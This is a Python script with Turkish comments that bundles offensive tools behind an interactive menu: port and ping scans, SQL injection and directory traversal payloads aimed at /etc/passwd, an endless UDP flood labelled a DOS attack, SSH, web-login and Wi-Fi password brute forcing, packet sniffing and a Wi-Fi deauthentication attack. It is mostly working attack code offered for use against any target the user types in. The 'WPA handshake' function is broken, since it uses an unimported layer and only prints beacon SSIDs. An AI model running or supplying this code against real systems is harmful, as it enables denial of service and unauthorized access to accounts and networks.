import os
import socket
import subprocess
import requests
import paramiko
from scapy.all import Dot11, Dot11Deauth, sniff, sendp

# 1. Port Taraması
def port_scan(target):
    print(f"Port taraması başlatılıyor: {target}")
    for port in range(20, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} açık")
        sock.close()

# 2. Ping Taraması
def ping_scan(target):
    print(f"{target} için Ping taraması yapılıyor...")
    response = os.system(f"ping -c 1 {target}")
    if response == 0:
        print(f"{target} ulaşılabilir.")
    else:
        print(f"{target} ulaşılamıyor.")

# 3. Wi-Fi Ağı Tarama (Windows için)
def wifi_scan():
    print("Wi-Fi ağları taranıyor...")
    networks = subprocess.check_output(['netsh', 'wlan', 'show', 'network'])
    print(networks.decode('utf-8'))

# 4. Basit Parola Kırma
def password_cracker(password_list, target_password):
    print("Parola kırma işlemi başlatılıyor...")
    for password in password_list:
        if password.strip() == target_password:
            print(f"Parola bulundu: {password.strip()}")
            return
    print("Parola bulunamadı.")

# 5. SQL Injection Zafiyet Tarama
def sql_injection_scan(url):
    print(f"{url} üzerinde SQL Injection taraması yapılıyor...")
    payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' OR 1=1 --"]
    for payload in payloads:
        full_url = f"{url}{payload}"
        response = requests.get(full_url)
        if "error" in response.text or "mysql" in response.text:
            print(f"Zafiyet bulundu: {payload}")
            return
    print("SQL Injection zafiyeti bulunamadı.")

# 6. DOS Saldırı Simülasyonu
def dos_attack(target_ip, port):
    print(f"{target_ip}:{port} üzerinde DOS saldırısı başlatılıyor...")
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = b"A" * 1024
    while True:
        try:
            client.sendto(bytes_to_send, (target_ip, port))
        except KeyboardInterrupt:
            print("DOS saldırısı durduruldu.")
            break

# 7. SSH Kaba Kuvvet Saldırısı (Brute Force)
def ssh_brute_force(target_ip, username, password_list):
    print(f"{target_ip} üzerinde SSH Kaba Kuvvet Saldırısı başlatılıyor...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    for password in passwords:
        try:
            ssh.connect(target_ip, username=username, password=password.strip())
            print(f"Başarılı giriş: {username}:{password.strip()}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"Giriş başarısız: {username}:{password.strip()}")
    print("SSH kaba kuvvet saldırısı başarısız oldu.")

# 8. Wi-Fi Ağına Bağlanma
def connect_to_wifi(ssid, password):
    print(f"Wi-Fi ağına bağlanılıyor: {ssid}")
    result = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}', f'ssid={ssid}', f'key={password}'], capture_output=True)
    print(result.stdout.decode())

# 9. Wi-Fi Parola Kaba Kuvvet Saldırısı
def wifi_password_cracker(ssid, password_list):
    print(f"{ssid} için Wi-Fi parola kaba kuvvet saldırısı başlatılıyor...")
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    for password in passwords:
        result = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}', f'ssid={ssid}', f'key={password.strip()}'], capture_output=True)
        if "successfully" in result.stdout.decode():
            print(f"Başarılı Wi-Fi bağlantısı: {ssid}:{password.strip()}")
            return
        else:
            print(f"Bağlantı başarısız: {ssid}:{password.strip()}")
    print("Wi-Fi parola kaba kuvvet saldırısı başarısız oldu.")

# 10. Paket Dinleme
def packet_sniffer(interface):
    print(f"Paket dinleme başlatılıyor: {interface}")
    def packet_callback(packet):
        print(packet.summary())
    sniff(iface=interface, prn=packet_callback, store=0)

# 11. Deauth Saldırısı
def deauth_attack(interface, target_mac, ap_mac):
    print(f"Deauth saldırısı başlatılıyor: {interface}")
    packet = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.1)

# 12. WPA Handshake Yakalama
def capture_wpa_handshake(interface):
    print(f"WPA handshake yakalama başlatılıyor: {interface}")
    def packet_callback(packet):
        if packet.haslayer(Dot11) and packet.haslayer(Dot11Beacon): # type: ignore
            if packet.info:
                print(f"SSID: {packet.info.decode()}")
    sniff(iface=interface, prn=packet_callback, store=0)

# 13. Brute Force Login (Kaba Kuvvetle Giriş)
def brute_force_login(url, username, password_list):
    print(f"{url} üzerinde kaba kuvvetle giriş denemesi yapılıyor...")
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    
    # Başarı ve başarısızlık belirteçlerini tanımlama
    success_indicator = "başarı ile giriş yaptınız"  # Başarıyı belirten bir belirteç girin
    failure_indicators = ["hatalı kullanıcı adı veya şifre", "şifre yanlış", "giriş başarısız"]  # Başarısızlığı belirten belirteçler
    
    for password in passwords:
        payload = {'username': username, 'password': password.strip()}
        response = requests.post(url, data=payload)
        
        # İçerik analizi
        if success_indicator in response.text:
            print(f"Başarılı giriş: {username}:{password.strip()}")
            return
        elif any(failure_message in response.text for failure_message in failure_indicators):
            print(f"Giriş başarısız: {username}:{password.strip()}")
        else:
            print(f"Yanıtsız giriş: {username}:{password.strip()}")
    
    print("Kaba kuvvetle giriş başarısız oldu.")

# 14. Directory Traversal Testi
def directory_traversal_test(url):
    print(f"{url} üzerinde dizin geçişi testi yapılıyor...")
    payloads = ["../../../../etc/passwd", "../../../etc/passwd", "/etc/passwd", "../etc/passwd"]
    for payload in payloads:
        full_url = f"{url}{payload}"
        response = requests.get(full_url)
        if "root:" in response.text:
            print(f"Dizin geçişi zafiyeti bulundu: {payload}")
            return
    print("Dizin geçişi zafiyeti bulunamadı.")

# Kullanıcı menüsü
def menu():
    print("""
    Siber Güvenlik Araçları:
    1. Port Taraması
    2. Ping Taraması
    3. Wi-Fi Ağı Tarama
    4. Parola Kırma
    5. SQL Injection Zafiyet Tarama
    6. DOS Saldırısı
    7. SSH Kaba Kuvvet Saldırısı
    8. Wi-Fi Ağına Bağlanma
    9. Wi-Fi Parola Kaba Kuvvet Saldırısı
    10. Paket Dinleme
    11. Deauth Saldırısı
    12. WPA Handshake Yakalama
    13. Brute Force Login (Kaba Kuvvetle Giriş)
    14. Directory Traversal Testi
    """)
    choice = input("Bir seçenek girin: ")
    
    if choice == '1':
        target = input("Hedef IP adresi: ")
        port_scan(target)
    
    elif choice == '2':
        target = input("Hedef IP adresi: ")
        ping_scan(target)
    
    elif choice == '3':
        wifi_scan()
    
    elif choice == '4':
        password_list = input("Parola listesi dosyası: ")
        target_password = input("Kırılacak parola: ")
        with open(password_list, 'r') as file:
            passwords = file.readlines()
        password_cracker(passwords, target_password)
    
    elif choice == '5':
        url = input("Hedef URL (SQL Injection test edilecek site): ")
        sql_injection_scan(url)
    
    elif choice == '6':
        target_ip = input("Hedef IP adresi: ")
        port = int(input("Hedef port: "))
        dos_attack(target_ip, port)
    
    elif choice == '7':
        target_ip = input("Hedef IP adresi: ")
        username = input("SSH kullanıcı adı: ")
        password_list = input("Parola listesi dosyası: ")
        ssh_brute_force(target_ip, username, password_list)
    
    elif choice == '8':
        ssid = input("Wi-Fi SSID: ")
        password = input("Wi-Fi Parolası: ")
        connect_to_wifi(ssid, password)
    
    elif choice == '9':
        ssid = input("Wi-Fi SSID: ")
        password_list = input("Parola listesi dosyası: ")
        wifi_password_cracker(ssid, password_list)
    
    elif choice == '10':
        interface = input("Paket dinleme için ağ arayüzü: ")
        packet_sniffer(interface)
    
    elif choice == '11':
        interface = input("Deauth saldırısı için ağ arayüzü: ")
        target_mac = input("Hedef MAC adresi: ")
        ap_mac = input("Erişim noktası MAC adresi: ")
        deauth_attack(interface, target_mac, ap_mac)
    
    elif choice == '12':
        interface = input("WPA handshake yakalama için ağ arayüzü: ")
        capture_wpa_handshake(interface)
    
    elif choice == '13':
        url = input("Giriş denemesi yapılacak URL: ")
        username = input("Kullanıcı adı: ")
        password_list = input("Parola listesi dosyası: ")
        brute_force_login(url, username, password_list)
    
    elif choice == '14':
        url = input("Dizin geçişi testi yapılacak URL: ")
        directory_traversal_test(url)
    
    else:
        print("Geçersiz seçenek. Lütfen tekrar deneyin.")

if __name__ == "__main__":
    menu()
